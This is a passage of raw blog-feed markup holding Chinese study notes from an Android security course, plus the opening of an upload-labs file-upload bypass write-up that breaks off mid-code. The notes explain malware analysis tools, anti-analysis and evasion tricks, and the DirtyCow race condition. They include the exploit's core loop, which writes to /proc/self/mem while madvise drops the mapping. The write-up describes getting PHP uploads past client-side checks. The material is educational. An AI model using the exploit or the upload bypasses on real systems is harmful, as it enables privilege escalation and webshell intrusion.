alt="img"></p><ul><li>对比法，白应用比较。</li></ul><p><img src="http://handsomedog.top/wp-content/uploads/2020/01/antian_6.png" alt="img"></p><ul><li>代码流程法、AndroidManifest.xml入手</li></ul><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_7.png" alt="img"></p><ul><li>一个个类看</li></ul><h4 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h4><p>工具：Andebug、IDA、smali hook、xposed&#x2F;substrate&#x2F;frida、wireshark&#x2F;tcpdump&#x2F;burpsuite&#x2F;findler2。</p><p>感觉这多用的还是Hook技术。</p><h4 id="分析系统"><a href="#分析系统" class="headerlink" title="分析系统"></a>分析系统</h4><p>相关工具：DroidBox、AndroGuard、Inpseckage基于xposed、RMS（antiy）、cuckoo（<a href="https://cuckoosandbox.org)/">https://cuckoosandbox.org）</a></p><p>方法一：模拟器</p><p>emulator -tcpdump x.pcap</p><p>方法二：tcpdump for ARM</p><p><a href="http://www.strazzere.com/android/tcpdump%E3%80%81%E9%9C%80%E8%A6%81root%E6%9D%83%E9%99%90%E3%80%82">http://www.strazzere.com/android/tcpdump、需要root权限。</a></p><p>方法三：</p><p>wifi + wireshark</p><h4 id="恶意代码-在线系统"><a href="#恶意代码-在线系统" class="headerlink" title="恶意代码-在线系统"></a>恶意代码-在线系统</h4><ul><li>Vitrustotal <a href="https://www.virustotal.com/">https://www.virustotal.com/</a></li><li>Sandroid <a href="http://sanddroid.xjtu.edu.cn/">http://sanddroid.xjtu.edu.cn</a></li><li>Koodous <a href="https://koodous.com/">https://koodous.com/</a></li><li>Janus <a href="https://www.appscan.io/">https://www.appscan.io</a></li></ul><p>更加注重分析工具、方法、手段等。以及工程化对抗，以及生态合作空间，和厂商对于反病毒的态度。</p><h3 id="移动威胁情报"><a href="#移动威胁情报" class="headerlink" title="移动威胁情报"></a>移动威胁情报</h3><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_8.png" alt="img"></p><h3 id="移动威胁对抗"><a href="#移动威胁对抗" class="headerlink" title="移动威胁对抗"></a>移动威胁对抗</h3><h4 id="对抗分析工具"><a href="#对抗分析工具" class="headerlink" title="对抗分析工具"></a>对抗分析工具</h4><p>Ptrace自身、https校验、检测父进程、伪&#x2F;加密、Axml &#x2F;资源文件对抗、自校验、畸形包、代码隐藏、加壳、混淆、加密、反射调用。</p><h4 id="对抗用户感知"><a href="#对抗用户感知" class="headerlink" title="对抗用户感知"></a>对抗用户感知</h4><p>隐藏图标、透明图标、静默下载&#x2F;安装、预装、植入知名应用、伪装系统应用、ISP劫持、邮件、社工。</p><h4 id="反跟踪"><a href="#反跟踪" class="headerlink" title="反跟踪"></a>反跟踪</h4><p>利用短链接、域名隐私保护、伪基站、动态DNS、盗用他人信息、使用云服务<br>、入侵无关站点。</p><h3 id="恶意代码层次利用"><a href="#恶意代码层次利用" class="headerlink" title="恶意代码层次利用"></a>恶意代码层次利用</h3><h4 id="Application层"><a href="#Application层" class="headerlink" title="Application层"></a>Application层</h4><p>主要威胁：流氓推广，恶意预装、流氓广告、钓鱼应用、欺诈。</p><h4 id="FrameWork层"><a href="#FrameWork层" class="headerlink" title="FrameWork层"></a>FrameWork层</h4><p>主要威胁：隐私窃取、拦截广播、勒索、远控、漏洞利用。尤其是在Native层，对抗分析、隐藏自身。</p><h4 id="Kernel层"><a href="#Kernel层" class="headerlink" title="Kernel层"></a>Kernel层</h4><p>主要威胁：系统破坏、提权</p><h4 id="RottenSys"><a href="#RottenSys" class="headerlink" title="RottenSys"></a>RottenSys</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_9.png" alt="img"></p><h3 id="机器学习应用"><a href="#机器学习应用" class="headerlink" title="机器学习应用"></a>机器学习应用</h3><ul><li>文件相似性检验</li><li>聚类分析</li><li>随机性识别</li><li>色情应用识别</li></ul><h3 id="基于样本运营的互联网风控"><a href="#基于样本运营的互联网风控" class="headerlink" title="基于样本运营的互联网风控"></a>基于样本运营的互联网风控</h3><p>不听老师说，真不知道互联网黑灰产市场规模这么大。</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_10.png" alt="img"></p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_11.png" alt="img"></p><h2 id="第四天-01月16日"><a href="#第四天-01月16日" class="headerlink" title="第四天 01月16日"></a>第四天 01月16日</h2><p>CTF中的移动安全出题总体以安卓APP逆向居多，考察点多为逆向基本功。Pwn方向多为组件漏洞、WebView漏洞，Native漏洞利用。</p><h3 id="主要是摸鱼"><a href="#主要是摸鱼" class="headerlink" title="主要是摸鱼"></a>主要是摸鱼</h3><h2 id="第五天-01月17日"><a href="#第五天-01月17日" class="headerlink" title="第五天 01月17日"></a>第五天 01月17日</h2><p>分布式网络&amp;分布式协同</p><h3 id="分布式网络概述"><a href="#分布式网络概述" class="headerlink" title="分布式网络概述"></a>分布式网络概述</h3><p><strong>分布式网络</strong>是由不同地点的计算机系统连成的网络结构。</p><p><strong>分布式系统</strong>是一个硬件或软件组件分布在不同的网络计算机上，彼此之间仅仅通过消息传递进行通信和协调的系统。</p><h3 id="基于WIFI-Direct的漏洞挖掘"><a href="#基于WIFI-Direct的漏洞挖掘" class="headerlink" title="基于WIFI-Direct的漏洞挖掘"></a>基于WIFI-Direct的漏洞挖掘</h3><h3 id="蓝牙漏洞学习"><a href="#蓝牙漏洞学习" class="headerlink" title="蓝牙漏洞学习"></a>蓝牙漏洞学习</h3><h2 id="第六天-01月18日"><a href="#第六天-01月18日" class="headerlink" title="第六天 01月18日"></a>第六天 01月18日</h2><p>安卓提权漏洞基础、原理、利用和发现方法简介。</p><p>动手：内核代码熟悉、编译。</p><h3 id="安卓提权漏洞基础"><a href="#安卓提权漏洞基础" class="headerlink" title="安卓提权漏洞基础"></a>安卓提权漏洞基础</h3><p>Android NativeLib和Kernel简介和攻击面。Android完整系统源码c&#x2F;c++相比java更多。</p><p>APP漏洞 vs 系统漏洞：影响设备、影响用户、查找难度、修补难度。</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E6%94%BB%E5%87%BB%E9%9D%A2.png" alt="img"></p><h4 id="安卓底层安全架构简介"><a href="#安卓底层安全架构简介" class="headerlink" title="安卓底层安全架构简介"></a>安卓底层安全架构简介</h4><p>这里在第一天讲过，不在赘述。再补充一下开源代码所遵循的协议：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E5%BC%80%E6%BA%90.png" alt="img"></p><p>对于安卓开源问题，<code>linux kernel</code>使用<code>GPL</code>许可证。</p><p>硬件开发商不愿意将自己的代码公开，所以谷歌用了：HAL层。</p><ul><li>修改内核，增加一些HAL的接口，这些代码使用GPL协议，完全公开。</li><li>增加HAL层，调用上一步定义好的内核接口。</li><li>在HAL层中定义好上层调用所需的统一API。</li></ul><p>Android底层安全框架及攻击缓释技术：</p><p>1、自主访问控制</p><ul><li>基于uid、gid。容易被突破，但总比没有强。</li></ul><p>2、强制访问控制</p><ul><li>SELinux，完善之后攻破非常困难，极大降低攻击后的危害。</li></ul><p>3、验证启动模式（Verified Boot）</p><ul><li>通过硬件密钥，逐步验证整个系统。一旦出厂之后，不可修改。修改之后系统无法启动。（测试、解锁BootLoader后可以启动）。</li></ul><p>4、代码签名和平台密钥</p><ul><li>无法刷入任何非签名镜像。System级别的签名验证。</li></ul><p>Root相关基础知识：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/root%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86.png" alt="img"></p><h4 id="原生代码库及其攻击面"><a href="#原生代码库及其攻击面" class="headerlink" title="原生代码库及其攻击面"></a>原生代码库及其攻击面</h4><h4 id="内核攻击面"><a href="#内核攻击面" class="headerlink" title="内核攻击面"></a>内核攻击面</h4><h3 id="Android框架提权漏洞"><a href="#Android框架提权漏洞" class="headerlink" title="Android框架提权漏洞"></a>Android框架提权漏洞</h3><ul><li>反序列化漏洞：7911</li></ul><h3 id="动手：内核代码熟悉、下载、和编译"><a href="#动手：内核代码熟悉、下载、和编译" class="headerlink" title="动手：内核代码熟悉、下载、和编译"></a>动手：内核代码熟悉、下载、和编译</h3><h4 id="竞争条件漏洞：脏牛（DirtyCow）"><a href="#竞争条件漏洞：脏牛（DirtyCow）" class="headerlink" title="竞争条件漏洞：脏牛（DirtyCow）"></a>竞争条件漏洞：脏牛（DirtyCow）</h4><p>基础知识梳理：</p><ul><li>虚拟内存管理和写时复制（<code>copy on write</code>）、页式内存管理和缺页中断、<code>linux</code>内存虚拟文件系统（<code>Proc</code>）、竞争条件（<code>Race condition</code>）、相关函数。</li></ul><p>漏洞分析：</p><ul><li>写时复制（<code>copy on write</code>）、竞争条件（<code>Race condition</code>）。</li></ul><p>利用方式：</p><ul><li><code>set-uid</code>位、<code>vdso</code>绕过<code>selinux</code>。</li></ul><h5 id="写时复制"><a href="#写时复制" class="headerlink" title="写时复制"></a>写时复制</h5><p>写入时复制是一种计算机程序设计领域的优化策略。其核心思想是，如果有多个调用者同时请求相同资源，他们会共同获取相同的指针指向相同的资源，直到某个调用者试图修改资源的内容时，系统才会真正复制一份专用副本（<code>private copy</code>）给该调用者，而其他调用者所见到的最初的资源仍然保持不变。这个过程对其他的调用者是透明的（<code>transparently</code>）。此作法的主要优点是如果调用者没有修改该资源，就不会有副本（<code>private copy</code>）被建立，因此多个调用者只是读取操作是可以共享同一份资源。提高物理内存利用率：虚拟内存，物理内存，共享只读存储。提高fork等执行速度。</p><p>Pagecache：Mmap之后不去读写，不载入内存，如果读写，载入内存。</p><h5 id="页式内存管理和缺页中断"><a href="#页式内存管理和缺页中断" class="headerlink" title="页式内存管理和缺页中断"></a>页式内存管理和缺页中断</h5><p>Linux内存管理：换出暂时不用的内存到外存，用的时候再换回来。分页（4kb）管理。如果访问发现要用的不在内存中，进程访问出现缺页中断，之后内核负责将要用的页重新装入内存，如果内存已满，将暂时不用的其他页换出外存。这个过程由内核负责处理，用户进程无感知。</p><h5 id="缺页中断"><a href="#缺页中断" class="headerlink" title="缺页中断"></a>缺页中断</h5><ul><li>硬件陷入内核，在堆栈中保存程序计数器。大多数机器将当前指令的各种状态信息保<br>存在特殊的CPU寄存器中。</li><li>启动一个汇编代码例程保存通用寄存器和其他易失的信息，以免被操作系统破坏。这<br>个例程将操作系统作为一个函数来调用。</li><li>当操作系统发现一个缺页中断时，尝试发现需要哪个虚拟页面。通常一个硬件寄存器<br>包含了这一信息，如果没有的话，操作系统必须检索程序计数器，取出这条指令，用<br>软件分析这条指令，看看它在缺页中断时正在做什么。</li><li>一旦知道了发生缺页中断的虚拟地址，操作系统检查这个地址是否有效，并检查存取<br>与保护是否一致。如果不一致，向进程发出一个信号或杀掉该进程。如果地址有效且<br>没有保护错误发生，系统则检查是否有空闲页框。如果没有空闲页框，执行页面置换<br>算法寻找一个页面来淘汰。</li><li>如果选择的页框“脏”了，安排该页写回磁盘，并发生一次上下文切换，挂起产生缺<br>页中断的进程，让其他进程运行直至磁盘传输结束。无论如何，该页框被标记为忙，<br>以免因为其他原因而被其他进程占用。</li><li>一旦页框“干净”后（无论是立刻还是在写回磁盘后），操作系统查找所需页面在磁<br>盘上的地址，通过磁盘操作将其装入。该页面被装入后，产生缺页中断的进程仍然被<br>挂起，并且如果有其他可运行的用户进程，则选择另一个用户进程运行。</li><li>当磁盘中断发生时，表明该页已经被装入，页表已经更新可以反映它的位置，页框也<br>被标记为正常状态。</li><li>恢复发生缺页中断指令以前的状态，程序计数器重新指向这条指令。</li><li>调度引发缺页中断的进程，操作系统返回调用它的汇编语言例程。</li><li>该例程恢复寄存器和其他状态信息，返回到用户空间继续执行，就好像缺页中断没有<br>发生过一样。</li></ul><h4 id="linux内存虚拟文件系统（Proc）"><a href="#linux内存虚拟文件系统（Proc）" class="headerlink" title="linux内存虚拟文件系统（Proc）"></a>linux内存虚拟文件系统（Proc）</h4><ul><li><code>/proc/pid/cmdline</code> 包含了用于开始进程的命令；</li><li><code>/proc/pid/cwd</code>包含了当前进程工作目录的一个链接；</li><li><code>/proc/pid/environ</code> 包含了可用进程环境变量的列表；</li><li><code>/proc/pid/exe</code> 包含了正在进程中运行的程序链接；</li><li><code>/proc/pid/fd/</code> 这个目录包含了进程打开的每一个文件的链接；</li><li><code>/proc/pid/stat</code>包含了进程的状态信息；</li><li><code>/proc/pid/statm</code> 包含了进程的内存使用信息</li><li><strong><code>/proc/self/maps</code> 进程虚拟内存中加载的文件和库等</strong></li><li><strong><code>/proc/self/mem</code>这个文件是一个指向当前进程的虚拟内存文件的文件，当前进程可<br>以通过对这个文件进行读写以直接读写虚拟内存空间</strong></li></ul><h5 id="竞争条件漏洞"><a href="#竞争条件漏洞" class="headerlink" title="竞争条件漏洞"></a>竞争条件漏洞</h5><p>竞争条件是系统中的一种反常现象，由于现代Linux系统中大量使用并发编程，对资源进行共享，如果产生错误的访问模式，便可能产生内存泄露，系统崩溃，数据破坏，甚至安全问题。竞争条件漏洞就是多个进程访问同一资源时产生的时间或者序列的冲突，并利用这个冲突来对系统进行攻击。</p><h5 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">mmap</span>(<span class="hljs-type">void</span>* start, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot,<span class="hljs-type">int</span> flags,<span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)<br></code></pre></td></tr></table></figure><ul><li>将磁盘上的文件映射到虚拟内存中，对于这个函数唯一要说的就是当<code>flags</code>的<code>MAP_PRIVATE</code>被置为<code>1</code>时，对<code>mmap</code>得到内存映射进行的写操作会使内核触发<code>COW</code>操作，写的是<code>COW</code>后的内存，不会同步到磁盘的文件中。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">madvice</span>(<span class="hljs-type">caddr_t</span> addr, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> advice)<br></code></pre></td></tr></table></figure><ul><li>告诉内核内存<code>addr～addr+len</code>在接下来的使用状况，以便内核进行一些进一步的内存管理操作。当<code>advice</code>为<code>MADV_DONTNEED</code>时，此系统调用相当于通知内核<code>addr～addr+len</code>的内存在接下来不再使用，内核将释放掉这一块内存以节省空间，相应的页表项也会被置空。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* buf, <span class="hljs-type">size_t</span> count)</span></span><br></code></pre></td></tr></table></figure><ul><li>向<code>fd</code>描述符所指向的文件写入最多<code>count</code>长度的<code>buf</code>中的内容。</li></ul><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.png" alt="img"></p><p>可以看到主要原因：</p><p>在write的过程中，包含两个<code>non-atomic</code>操作：<code>1、locate the physical address</code>，<code>2、and write to that address</code>导致竞争条件的发生。下面来梳理一下利用流程：</p><p>1、打开一个只读文件，将它映射内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> f = open(<span class="hljs-string">&quot;readonly_file&quot;</span>, O_RDONLY);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">file_info</span>;</span><br>fstat(f, &amp;file_info);<br><span class="hljs-built_in">map</span> = mmap(<span class="hljs-literal">NULL</span>, file_info.st_size, PROT_READ, MAP_PRIVATE, f, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>2、尝试去写这个文件，这是触发<code>copy on wirte</code>机制，但是由于<code>write</code>那两个非原子操作，所以其他进程可以驳入执行代码。试想：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_1.png" alt="img"></p><p>尝试向文件写内容，此时状态如下图：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_2.png" alt="img"></p><p>由于触发了<code>copy on write</code>机制，状态发生变化：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_3.png" alt="img"></p><p>此时攻击者利用条件竞争驳入代码，将<code>private_mapping of root_file</code>除去，状态发生变化：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_4.png" alt="img"></p><p>再次回到<code>write</code>进程时，<code>kernel</code>已经指向原<code>root_file</code>，目的达成：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_5.png" alt="img"></p><p>所以需要两个进程，一个尝试去写，一个尝试去释放：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs CQL">void *write_to_mapping (void *arg) &#123;<br>    // Write to mapping through &#x27;/proc/self/mem&#x27;.<br>    int i;<br>    for (i = 0; i &lt; 10000; i++) &#123;<br>        int f = open(&quot;/proc/self/mem&quot;, O_RDWR);<br>        lseek(f, (uintptr_t)map, SEEK_SET);<br>        write(f, to_be_written, strlen(to_be_written));<br>    &#125;<br>&#125;<br><br><br>void* drop_mapping (void *arg) &#123;<br>    // (m)advise kernel to drop mapping.<br>    int i;<br>    for (i = 0; i &lt; 10000; i++)<br>        madvise(map, 100, MADV_DONTNEED);<br>&#125;<br><br>pthread_t thread_1, thread_2;<br>pthread_create(&amp;thread_1, NULL, write_to_mapping, NULL);<br>pthread_create(&amp;thread_2, NULL, drop_mapping, NULL);<br>pthread_join(thread_1, NULL);<br>pthread_join(thread_2, NULL);<br></code></pre></td></tr></table></figure><h4 id="UAF：CVE-2019-2215"><a href="#UAF：CVE-2019-2215" class="headerlink" title="UAF：CVE-2019-2215"></a>UAF：CVE-2019-2215</h4><p>1、找到漏洞描述。</p><p>2、找到对应的内核代码。</p><p>3、找到对应的POC和EXP。</p><p>4、研究漏洞利用方式。</p><p><code>CVE-2019-2215</code>由<code>Google公司Project Zero</code>小组发现，并被该公司的威胁分析小组（TAG）确认其已用于实际攻击中。TAG表示该漏洞利用可能跟一家出售漏洞和利用工具的以色列公司NSO有关，随后NSO集团发言人公开否认与该漏洞存在任何关系。该漏洞实质是内核代码一处UAF漏洞，成功利用可以造成本地权限提升，并有可能完全控制用户设备。但要成功利用该漏洞，需要满足某些特定条件。</p><h5 id="ANDROID-BINDER简介："><a href="#ANDROID-BINDER简介：" class="headerlink" title="ANDROID BINDER简介："></a><code>ANDROID BINDER</code>简介：</h5><p><code>IPC</code>是<code>Inter-process communication</code>的缩写，即进程间通信。<code>IPC</code>是一种允许进程间互相通信交换数据的机制。在<code>Linux</code>平台上，进程之间是隔离的，各个进程运行在自己的虚拟地址空间中，如果不采取IPC手段,进程之间是不能互相交换数据的。为了实现进程之间的数据交换，<code>Linux</code>提供了多种<code>IPC</code>机制：</p><ul><li>信号、管道、Socket、消息队列、信号量、共享内存</li></ul><p><code>Android</code>是基于<code>Linux</code>系统开发，除了上面的<code>IPC</code>机制以外，<code>Android</code>又提供了一种新的选择：<code>binder</code>。站在系统角度来看，<code>binder</code>的实现包括：</p><ul><li>一个<code>Client</code>进程、一个<code>Service</code>进程、<code>Binder</code>驱动。</li></ul><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/binder_1.png" alt="img"></p><p>而<code>Binder Driver</code>位于内核态，所有进程都可以访问，下图为<code>Binder</code>架构：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/binder_2.png" alt="img"></p><p><code>vectored I/O</code>基础：In computing, vectored I&#x2F;O, also known as scatter&#x2F;gather I&#x2F;O, is a method of input and output by which a single procedure call sequentially reads data from multiple buffers and writes it to a single data stream, or reads data from a data stream and writes it to multiple buffers, as defined in a vector of buffers.</p><h5 id="漏洞-–-BINDER-LOCTL"><a href="#漏洞-–-BINDER-LOCTL" class="headerlink" title="漏洞 – BINDER_LOCTL"></a>漏洞 – BINDER_LOCTL</h5><p>在binder_free_thread函数中，可以触发UAF。</p><p>TO-DO、挖坑。</p><h3 id="常用Fuzz技术"><a href="#常用Fuzz技术" class="headerlink" title="常用Fuzz技术"></a>常用Fuzz技术</h3><h4 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h4><p>暴力fuzzer，安全研究者和爱好者利用它已经有了非常多的产出。</p><p>特点：instrumentation-guided、genetic-algorithm、edge coverage to guide fuzzing。</p><p>AFL执行流程：</p><ul><li>load user-supplied initial test cases into the queue.</li><li>Take next input file from the queue.</li><li>Attempt to trim the test case to the smallest size that doesn’t alter the measure behavior of the program.</li><li>Repeatedly mutate the file using a balanced and well-researched variety of traditional fuzzing strategies.</li><li>If any of the generated mutations resulted in a new state transition recoreded by the instrumentation, add mutated output as a new entry in the queue.</li><li>go to 2.</li></ul><p>Fuzzing技术是当前最为强大而有效的漏洞挖掘技术，大多的远程代码执行以及权限提升等较为严重的漏洞都是通过Fuzzing而产出的。AFL(American Fuzzy Lop)被称为目前最高级的Fuzzing测试工具之一，可以有效地对二进制程序进行fuzz，开启相应功能可更深入的根据需求挖掘相关漏洞，如栈溢出、堆溢出、UAF等。</p><p>AFL有两种fuzz途径：</p><ul><li>开源软件：AFL软件进行编译的同时进行插桩，以方便fuzz</li></ul><ol><li>闭源软件：配合QEMU直接对闭源的二进制代码进行fuzz</li></ol><p>插桩：在AFL编译文件时候afl-gcc会在规定位置插入桩代码，可以理解为一个个的小断点(但是没有暂停功能)，在后续fuzz的过程中会根据这些桩代码进行路径探索，测试等。使得测试覆盖面更广，更全面。另外，在每个分支插入桩代码的同时，<code>afl-as</code>会生成一个随机数作为标识这个代码块的<code>key</code>，运行时便可以利用这些生成的随机数来识别相应代码块。</p><p>AFL主要是由三部分组成：</p><ul><li>第一部分：编译器<code>wrapper</code>：他的功能在于对目标软件（开源）进行编译，编译过程中插入一些AFL识别的函数用以识别探索路径，众所周知的<code>linux</code>下的<code>C/C++</code>编译工具<code>gcc/g++</code>，<code>afl</code>的编译工具为<code>afl-gcc/afl-g++,afl-clang</code>等。</li><li>第二部分：测试器<code>fuzzer：afl-fuzz</code>，就是AFL重要的主体，用以对软件进行fuzzing。</li><li>第三部分：如<code>afl-cmin,afl-tmin</code>，都是为提升测试的效率和成功率而服务的。</li></ul><p>安装：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz<br><span class="hljs-attribute">tar</span> -zxvf afl-<span class="hljs-number">2</span>.<span class="hljs-number">52</span>b.tgz<br><span class="hljs-attribute">cd</span> afl-<span class="hljs-number">2</span>.<span class="hljs-number">52</span>b<br><span class="hljs-attribute">make</span><br><span class="hljs-attribute">sudo</span>  make install<br></code></pre></td></tr></table></figure><p><code>ASAN(Address Sanitizer)</code>是<code>linux</code>下的内存检测工具，早先是<code>LLVM</code>中的特性，后来被加入<code>GCC 4.9</code>，现被<code>clang</code>和<code>gcc</code>支持，用于运行的时候对内存进行检测，以达到发现内存漏洞的效果。</p><p>在开启<code>ASAN</code>后。<code>afl</code>插桩则会在目标代码的关键位置添加检查代码，例如：<code>malloc(),free()</code>等，一旦发现了内存访问错误，便可以<code>SIGABRT</code>中止程序。</p><p>需要注意的是：</p><ul><li>1、例如越界读等内存访问错误不一定会造成程序的崩溃，所以在没有开启ASAN的情况下，许多内存漏洞都无法被AFL给发现。所以在编译二进制代码的时候，强烈建议开启ASAN。</li><li>2、ASAN开启后的fuzzing会消耗更多的内存，这是需要注意的因素，对于32位的程序，基本上800MB即可；但64为程序大概需要20TB,所以，使用ASAN的话，建议添加CFLAGS&#x3D;-m32来限制编译目标为32位，否则，可能应为64位消耗内存过多而造成程序崩溃。</li><li>3、 在使用了ASAN之后，可以再alf-fuzz的时候通过选项-m来指定使用的内存上限。启用了ASAN的32位程序，一般设置-m 1024即可。</li></ul><h4 id="Syzkaller"><a href="#Syzkaller" class="headerlink" title="Syzkaller"></a>Syzkaller</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/syzkaller.png" alt="img"></p><p>To be continue…</p><p>因为自己整理的一片一片很乱，引用了<a href="http://handsomedog.top/?p=461&from=timeline&isappinstalled=0">帅帅狗师傅的笔记</a>作为记载方便学习，已征得本人同意。</p>]]></content>
    
    
    <categories>
      
      <category>移动安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于upload-labs的文件上传汇总</title>
    <link href="/2019/11/17/upload-labs/"/>
    <url>/2019/11/17/upload-labs/</url>
    
    <content type="html"><![CDATA[<p><img src="https://s2.ax1x.com/2020/02/09/1WX691.png" alt="1WX691.png"></p><h1 id="前端-js-校验"><a href="#前端-js-校验" class="headerlink" title="前端 js 校验"></a>前端 js 校验</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> file = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;<br>    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;请选择要上传的文件!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//定义允许上传的文件类型</span><br>    <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.png|.gif&quot;</span>;<br>    <span class="hljs-comment">//提取上传文件的类型</span><br>    <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_">substring</span>(file.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));<br>    <span class="hljs-comment">//判断上传文件类型是否允许上传</span><br>    <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_">indexOf</span>(ext_name + <span class="hljs-string">&quot;|&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="hljs-string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;<br>        <span class="hljs-title function_">alert</span>(errMsg);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上传之前，通过<code>js</code>判断一下文件后缀是否为<code>.jpg</code>|<code>.png</code>|<code>.gif</code>,不是就不允许上传。</p><p>绕过方法</p><p>对于前端<code>js</code>验证的绕过方法较为简单，我们可以将要上传的<code>php</code>文件改后缀名为 <code>jpg</code>|<code>png</code>|<code>gif</code>，绕过<code>js</code>验证后，再用<code>burp更改上传请求</code>，或者浏览器<code>禁用js</code>后进行上传。</p><h1 id="Content-Type-校验"><a href="#Content-Type-校验" class="headerlink" title="Content-Type 校验"></a>Content-Type 校验</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-keyword">if</span> ((<span 